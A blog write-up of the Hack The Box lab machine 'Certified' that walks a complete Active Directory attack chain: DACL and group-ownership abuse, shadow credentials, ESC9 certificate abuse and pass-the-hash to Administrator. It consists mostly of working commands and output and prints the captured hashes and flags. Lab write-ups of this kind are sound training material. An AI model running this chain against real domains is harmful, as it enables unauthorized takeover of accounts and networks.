---
title: Certified 
date: 2026-08-26 00:00:00 +0800 
categories: [HTB, Box]
image:
    path: certified.jpg
layout: post 
media_subpath: /assets/posts/certified
---

# HTB Certified - Medium

```terminal
Me > 10.10.14.74
Target > 10.129.231.186
```

As is common in Windows pentests, you will start the Certified box with credentials for the following account: Username: judith.mader Password: judith09

We start the box with some credentials.

## Foothold

Lets start with a nmap scan

```terminal
nmap 10.129.231.186 -sV -sC -p- -v -oN nmap.txt

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-27 02:29:46Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-27T02:31:18+00:00; +6h58m13s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Issuer: commonName=certified-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-11T21:05:29
| Not valid after:  2105-05-23T21:05:29
| MD5:     ac8a 4187 4d19 237f 7cfa de61 b5b2 941f
| SHA-1:   85f1 ada4 c000 4cd3 13de d1c2 f3c6 58f7 7134 d397
|_SHA-256: efbd f880 f25e 9059 7d06 867b ba6c 7050 277e 6fa7 aa81 5bee 9b4c bf63 358d e0b8
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-27T02:31:17+00:00; +6h58m13s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Issuer: commonName=certified-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-11T21:05:29
| Not valid after:  2105-05-23T21:05:29
| MD5:     ac8a 4187 4d19 237f 7cfa de61 b5b2 941f
| SHA-1:   85f1 ada4 c000 4cd3 13de d1c2 f3c6 58f7 7134 d397
|_SHA-256: efbd f880 f25e 9059 7d06 867b ba6c 7050 277e 6fa7 aa81 5bee 9b4c bf63 358d e0b8
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-27T02:31:18+00:00; +6h58m13s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Issuer: commonName=certified-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-11T21:05:29
| Not valid after:  2105-05-23T21:05:29
| MD5:     ac8a 4187 4d19 237f 7cfa de61 b5b2 941f
| SHA-1:   85f1 ada4 c000 4cd3 13de d1c2 f3c6 58f7 7134 d397
|_SHA-256: efbd f880 f25e 9059 7d06 867b ba6c 7050 277e 6fa7 aa81 5bee 9b4c bf63 358d e0b8
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Issuer: commonName=certified-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-11T21:05:29
| Not valid after:  2105-05-23T21:05:29
| MD5:     ac8a 4187 4d19 237f 7cfa de61 b5b2 941f
| SHA-1:   85f1 ada4 c000 4cd3 13de d1c2 f3c6 58f7 7134 d397
|_SHA-256: efbd f880 f25e 9059 7d06 867b ba6c 7050 277e 6fa7 aa81 5bee 9b4c bf63 358d e0b8
|_ssl-date: 2026-08-27T02:31:17+00:00; +6h58m13s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49726/tcp open  msrpc         Microsoft Windows RPC
49738/tcp open  msrpc         Microsoft Windows RPC
49776/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-27T02:30:37
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h58m12s, deviation: 0s, median: 6h58m12s
```

Just looks like a normal domain controller. 

We can start collection bloodhound data. But first we can add the host names. 

```terminal
┌──(songbird㉿kali)-[~/Desktop/certified]
└─$ sudo nxc smb 10.129.231.186 -u '' -p '' --generate-hosts-file /etc/hosts
SMB         10.129.231.186  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.231.186  445    DC01             [+] certified.htb\: 

┌──(songbird㉿kali)-[~/Desktop/certified]
└─$ bloodhound-python -d 'certified.htb' -u 'judith.mader' -p 'judith09' -c All -ns 10.129.231.186

<REDACTED>

INFO: Done in 00M 32S
```

### Management_svc

![Certified](c1.png)

We see that we have a attack path from judith.mader -> MANAGEMENT_SVC

Summary of the attack path.

Judith.mader has WriteOwner rights on the Management group (visible via BloodHound). She abuses this by first taking ownership of the group with owneredit, changing the owner from Domain Admins to herself -> then using dacledit to grant herself WriteMembers on the group, since owning an object lets you rewrite its DACL to add any permission -> then adding herself as a member of the group with bloodyAD, which now contains her alongside MANAGEMENT_SVC. The group has GenericWrite over MANAGEMENT_SVC

```terminal
┌──(songbird㉿kali)-[~/Desktop/certified]
└─$ impacket-owneredit -action write -new-owner judith.mader -target management certified/judith.mader:judith09 -dc-ip 10.129.231.186
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=certified,DC=htb
[*] OwnerSid modified successfully!
                                                                                                            
┌──(songbird㉿kali)-[~/Desktop/certified]
└─$ impacket-dacledit -action 'write' -rights 'WriteMembers' -principal judith.mader -target Management 'certified'/'judith.mader':'judith09' -dc-ip 10.129.231.186
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/dacledit.py:390: DeprecationWarning: codecs.open() is deprecated. Use open() instead.
  with codecs.open(self.filename, 'w', 'utf-8') as outfile:
[*] DACL backed up to dacledit-20260827-121437.bak
[*] DACL modified successfully!
```

We also need to add ourselfs to the group

```terminal
┌──(songbird㉿kali)-[~/Desktop/certified]
└─$ bloodyad --host 10.129.231.186 -d certified.htb -u judith.mader -p judith09 add groupMember Management judith.mader                                            
[+] judith.mader added to Management
                                                                                                                      
┌──(songbird㉿kali)-[~/Desktop/certified]
└─$ bloodyad --host 10.129.231.186 -d certified.htb -u judith.mader -p judith09 get object Management --attr member

distinguishedName: CN=Management,CN=Users,DC=certified,DC=htb
member: CN=management service,CN=Users,DC=certified,DC=htb; CN=Judith Mader,CN=Users,DC=certified,DC=htb
```

We can confirm we are in the group by the last bloodyad command. IMPORTANT there is a cron job running pretty often that reverts the change so if commands fail go back to the first impacket script and redo it.

![Certified](c2.png)

We see that we have as users in the Management group have GenericWrite over MANAGEMENT_SVC 

At first I tried a kerberoast attack but I could not crack the hash. Instead we are going for a shadow credentials attack 

```terminal
┌──(songbird㉿kali)-[~/Desktop/certified]
└─$ sudo rdate -n 10.129.231.186
Sat Aug 29 22:10:42 EDT 2026

┌──(songbird㉿kali)-[~/Desktop/certified]
└─$ certipy-ad shadow auto -username judith.mader@certified.htb -password judith09 -account management_svc -target certified.htb -dc-ip 10.129.231.186
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'management_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'd0adb041fcce4b54a179dcdf0bacc89e'
[*] Adding Key Credential with device ID 'd0adb041fcce4b54a179dcdf0bacc89e' to the Key Credentials for 'management_svc'
[*] Successfully added Key Credential with device ID 'd0adb041fcce4b54a179dcdf0bacc89e' to the Key Credentials for 'management_svc'
[*] Authenticating as 'management_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'management_svc@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'management_svc.ccache'
[*] Wrote credential cache to 'management_svc.ccache'
[*] Trying to retrieve NT hash for 'management_svc'
[*] Restoring the old Key Credentials for 'management_svc'
[*] Successfully restored the old Key Credentials for 'management_svc'
[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
```

error 1

If you see for example this. Even thought it says it succeded check that your on the same time as kerberos. Also if it fails but your on just sync your time check if something is reverting your time sync.
```terminal
[*] NT hash for 'management_svc': None
```

error 2

If you get this error just redo the steps before as the cron job reverted the change. If you rerun the commands it should work.

```terminal
[-] Could not update Key Credentials for 'management_svc' due to insufficient access rights: 00002098: SecErr: DSID-031514A0, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0
```

## User

We got the hash for management_svc. We can check if it works. It does work. We also have permission over winrm (Pwn3d!) so, we can winrm and grab the user flag.

```terminal
┌──(songbird㉿kali)-[~/Desktop/certified]
└─$ nxc smb 10.129.231.186 -u 'management_svc' -H a091c1832bcdd4677c28b5a6a1295584
SMB         10.129.231.186  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.231.186  445    DC01             [+] certified.htb\management_svc:a091c1832bcdd4677c28b5a6a1295584 

┌──(songbird㉿kali)-[~/Desktop/certified]
└─$ nxc winrm 10.129.231.186 -u 'management_svc' -H a091c1832bcdd4677c28b5a6a1295584
WINRM       10.129.231.186  5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb) 
WINRM       10.129.231.186  5985   DC01             [+] certified.htb\management_svc:a091c1832bcdd4677c28b5a6a1295584 (Pwn3d!)

┌──(songbird㉿kali)-[~/Desktop/certified]
└─$ evil-winrm -i 10.129.231.186 -u 'management_svc' -H a091c1832bcdd4677c28b5a6a1295584
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\management_svc\Documents> cd ..
*Evil-WinRM* PS C:\Users\management_svc> cd Desktop
*Evil-WinRM* PS C:\Users\management_svc\Desktop> type user.txt
e06a3b08c18d1bddfc65efe688a16701
```

### Ca_operator

We can check if we got some outbound control over something and we do.

![Certified](c3.png)

management_svc got GenericAll over ca_operator

We can perform a orther shadow credential attack

```terminal
┌──(songbird㉿kali)-[~/Desktop/certified]
└─$ certipy-ad shadow auto -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -account CA_OPERATOR -target certified.htb -dc-ip 10.129.231.186
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_operator'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '5073024ec72f4979b204e990b7ac6b58'
[*] Adding Key Credential with device ID '5073024ec72f4979b204e990b7ac6b58' to the Key Credentials for 'ca_operator'
[*] Successfully added Key Credential with device ID '5073024ec72f4979b204e990b7ac6b58' to the Key Credentials for 'ca_operator'
[*] Authenticating as 'ca_operator' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_operator@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_operator.ccache'
[*] Wrote credential cache to 'ca_operator.ccache'
[*] Trying to retrieve NT hash for 'ca_operator'
[*] Restoring the old Key Credentials for 'ca_operator'
[*] Successfully restored the old Key Credentials for 'ca_operator'
[*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2
```

Lets also verify that we have access as ca_operator

```terminal
┌──(songbird㉿kali)-[~/Desktop/certified]
└─$ nxc smb 10.129.231.186 -u 'ca_operator' -H b4b86f45c6018f1b664f70805f45d8f2                                                                                                           
SMB         10.129.231.186  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.231.186  445    DC01             [+] certified.htb\ca_operator:b4b86f45c6018f1b664f70805f45d8f2 
```

### ES9

It works. We dont have anything outbound in bloodhound. We can run certipy to try find anything vulnerable

```terminal
┌──(songbird㉿kali)-[~/Desktop/certified]
└─$ certipy-ad find -vulnerable -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.129.231.186 -stdout                                                                    
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'certified-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'certified-DC01-CA'
[*] Checking web enrollment for CA 'certified-DC01-CA' @ 'DC01.certified.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : certified-DC01-CA
    DNS Name                            : DC01.certified.htb
    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
    Certificate Validity End            : 2124-05-13 15:43:41+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CERTIFIED.HTB\Administrators
      Access Rights
        ManageCa                        : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        ManageCertificates              : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Enroll                          : CERTIFIED.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CertifiedAuthentication
    Display Name                        : Certified Authentication
    Certificate Authorities             : certified-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : PublishToDs
                                          AutoEnrollment
                                          NoSecurityExtension
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-05-13T15:48:52+00:00
    Template Last Modified              : 2024-05-13T15:55:20+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFIED.HTB\operator ca
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFIED.HTB\Administrator
        Full Control Principals         : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Write Property Enroll           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CERTIFIED.HTB\operator ca
    [!] Vulnerabilities
      ESC9                              : Template has no security extension.
    [*] Remarks
      ESC9                              : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
```

It flags ESC9 as vulnerable.

[Link](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc9-no-security-extension "Link 1 for ESC9") 

[Link](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7 "Link 2 for ESC9/ESC10")

both these 2 links describes ESC9 pretty good. 

### Administrator

```terminal
┌──(songbird㉿kali)-[~/Desktop/certified]
└─$ certipy-ad account update -dc-ip 10.129.231.186 -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator 
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : Administrator
[*] Successfully updated 'ca_operator'

┌──(songbird㉿kali)-[~/Desktop/certified]
└─$ certipy-ad req -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.129.231.186
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 5
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

┌──(songbird㉿kali)-[~/Desktop/certified]
└─$ certipy-ad account update -dc-ip 10.129.231.186 -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb                          
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'

┌──(songbird㉿kali)-[~/Desktop/certified]
└─$ certipy-ad auth -pfx administrator.pfx -domain certified.htb -dc-ip 10.129.231.186                                                                             
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator'
[*] Using principal: 'administrator@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

We got the hash for the administrator account. Lets confirm it works.

```terminal
┌──(songbird㉿kali)-[~/Desktop/certified]
└─$ nxc smb 10.129.231.186 -u administrator -H 0d5b49608bbce1751f708748f67e2d34
SMB         10.129.231.186  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.231.186  445    DC01             [+] certified.htb\administrator:0d5b49608bbce1751f708748f67e2d34 (Pwn3d!)
```

![Certified](c4.jpg)

## Root

Lets grab the root flag. Instead of using winrm or nxc to get the root flag, im going to use psexec from impacket. Just to switch up habits.

```terminal
┌──(songbird㉿kali)-[~/Desktop/certified]
└─$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34 administrator@10.129.231.186
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.231.186.....
[*] Found writable share ADMIN$
[*] Uploading file bhxuchwc.exe
[*] Opening SVCManager on 10.129.231.186.....
[*] Creating service qNnq on 10.129.231.186.....
[*] Starting service qNnq.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.6414]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> type c:\Users\Administrator\Desktop\root.txt
f5498f97c1245dd1405d6ce77c1d1984
```

Pwned!
